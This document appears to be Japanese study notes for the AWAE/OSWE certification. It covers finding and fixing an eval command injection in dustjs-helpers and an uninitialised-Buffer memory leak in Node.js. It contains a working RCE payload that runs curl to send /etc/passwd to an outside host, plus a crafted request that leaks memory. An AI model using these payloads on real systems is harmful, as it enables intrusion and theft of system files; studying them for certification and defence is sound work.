<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [AWAE-preparation](#awae-preparation)
- [脆弱性発見方法](#%E8%84%86%E5%BC%B1%E6%80%A7%E7%99%BA%E8%A6%8B%E6%96%B9%E6%B3%95)
- [Vuln](#vuln)
  - [sample](#sample)
  - [Command Injection](#command-injection)
    - [dustjs-helper (Node.js)](#dustjs-helper-nodejs)
  - [Information leak](#information-leak)
    - [new Buffer(100); (Node.js)](#new-buffer100-nodejs)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考資料](#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# AWAE-preparation
# 脆弱性発見方法
エラー文が出て入れば、その該当箇所のソースコードをgithubで探して、wikiとかTutorialとかissueを見る。   
Injection系はevalを探す。   
見つかれば、ユーザーの入力をエスケープするような部分を`html`,`escape`とかのキーワードで検索して見つける。
# Vuln
## sample
- 概要   
- 例   
- 発見方法   
- 対策   
- 参考資料   
## Command Injection
### dustjs-helper (Node.js)
- 概要   
dustというNodeJSのモジュールの中の拡張機能であるdustjs-helper.jsというテンプレートエンジンのための便利メソッドがあるライブラリの中のifメソッドが脆弱だった。   
Javascriptのevalの中にユーザーの入力が入り込んでRCEできてしまう。   
htmlescapeはあるにはあるが、String型にしかチェックがされてないのでArray型にして入力すればHtmlEscape無しに入力できてしまう。   
- 例   

- 発見方法   
`/us/demo/navigation?device=desktop\`(%5c)を入力すると、500 internal errorが発生して、`scripts/node_modules/dustjs-helpers/lib/dust-helpers.js`の`Object.helpers.if`でSyntaxErrorが発生していることがわかる。   
なので、次は`dustjs-helpers/lib/dust-helpers.js`をgithubの公式で読む。   
`/dist`,`/lib`のどっちでも同じっぽい？？   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/dist/dust-helpers.js   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/lib/dust-helpers.js      
![image](https://user-images.githubusercontent.com/56021519/101359047-0eaccc00-38df-11eb-8c19-3e7b986d5b5b.png)   
`if helper`で検索すると該当箇所が見つかり、`eval`があることがわかる。   
if helperの挙動を確認するために、dustjsのgithubの**wiki**の**Dust tutorial**を読む。   
https://github.com/linkedin/dustjs/wiki/Dust-Tutorial#if_condcondition__if_helper_Removed_in_160_release   
見た感じ条件式をevalの中に入れてるっぽいらしい。   
つまり、`\`を入れると、`eval("'desktop\' === 'desktop'")`となってSyntaxErrorとなる。   
![image](https://user-images.githubusercontent.com/56021519/101359923-423c2600-38e0-11eb-875c-ce9b66c0bf69.png)   
任意のコマンドを実行するには`\`以外にも`'`とかも使う必要がある。ので、htmlEscapeする箇所を探して、そこら辺を探す。   
`escape`,`html`とかのキーワードで探すとよさそう？？   
https://github.com/linkedin/dustjs/blob/master/dist/dust-core.js   
どうやら`String`型の時しかEscapeされてないらしい。   
![image](https://user-images.githubusercontent.com/56021519/101360732-69dfbe00-38e1-11eb-9cfd-e98794fedb98.png)   
`?device=desktop`みたいにパラメータを渡す代わりに、`?device[]=1&device[]=2`みたいにして`Array`型でパラメータを渡せばEscapeされずにそのままevalまでたどり着きそう！   
Array型いきなり渡してもいいんだ…！？ふーん。   
`?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'`   
とするとRCEできるらしい！！！   
これは以下のようになるから。   
```js
// 元はこれ
eval("  ''  == 'desktop'  ")

// 上にPayloadを挿入するとこうなる。-は文字列の引き算？
> eval("  'y'-require('child_process').exec('cat /etc/passwd > ../nodejs/output')-''  == 'desktop'  "); 
false

// +でも-でもどっちでもよさそう
> eval("  'y'+require('child_process').exec('cat /etc/passwd > ../nodejs/output')+''  == 'desktop'  "); 
false
> 
```
- 対策   
evalの入力検証を実装する。htmlEscapeはString型だけじゃなくてすべての型で行う。   
- 参考資料   
https://artsploit.blogspot.com/2016/08/pprce2.html   
https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/   

## Information leak
### new Buffer(100); (Node.js)
- 概要   
Node.jsで以下のように`new Buffer(req.body.text)`でバッファを作成した場合、`req.body.text`の型がString型でない場合、Bufferはnewで使用される前に初期化されないので、サーバーのメモリを返す脆弱性。   
- 例   
```js
> console.log(new Buffer('aaaa'));
<Buffer 61 61 61 61>
undefined
> console.log(new Buffer(100));
<Buffer 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ... 50 more bytes>
undefined
>
```
つまり、ログイン処理で以下のようになっており、POST形式にはJSONが使われている場合、リクエストを細工することでメモリをリークできる。   
```js
        var password = new Buffer(req.body.password);
        if(password.toString('base64') == config.secret_password) {
            req.session.admin = 'yes';
            res.json({'status': 'ok' });
        } else {
            res.json({'status': 'error', 'error': 'password wrong: '+password.toString() });
            
// POSTするデータ
// {"password":"test"} // 文字列"test"を送信。通常
// {"password":100}    // 数値100を送信。Buffer(100)が.toString()によってリークされる
```
- 発見方法   
`new Buffer();`が書かれている箇所を探す。   
- 対策   
`new Bufffer()`は危険なのでBufferの代わりに、Buffer.fromとBuffer.allocとBuffer.allocUnsafeが追加された。   
Buffer.allocUnsafeは初期化されないが、それ以外は初期化されるっぽい。   
- 参考資料   
https://techblog.yahoo.co.jp/advent-calendar-2016/node_new_buffer/   
概要   
https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
Writeup   
# メモ
とにかくコードを読みなれている必要があるらしい。それが一番大事っぽい。それが今全然できないしHTBやっててもそれは伸びない気がする。   
まずはudemyとかpentesterAcademyのPHP,NodeJS,.net,JavaのWebアプリ開発コースを受講する必要がありそう。   
あとは脆弱性ごとにそれに該当するコード群と発見方法、着眼点とかを自分なりにまとめる必要がありそう。CVEとかも参考にした方がよさそう。   
受講は2月の春休み開始直後から1カ月でとりたい！それまでにいろいろ計画的に勉強するべし！

# 参考資料
https://alex-labs.com/my-awae-review-becoming-an-oswe/   
ホワイトボックスの方法論的なことが書いてある。超参考になりそう。   
   
https://stacktrac3.co/oswe-review-awae-course/   
こっちにも方法論的なことが書いてある。   
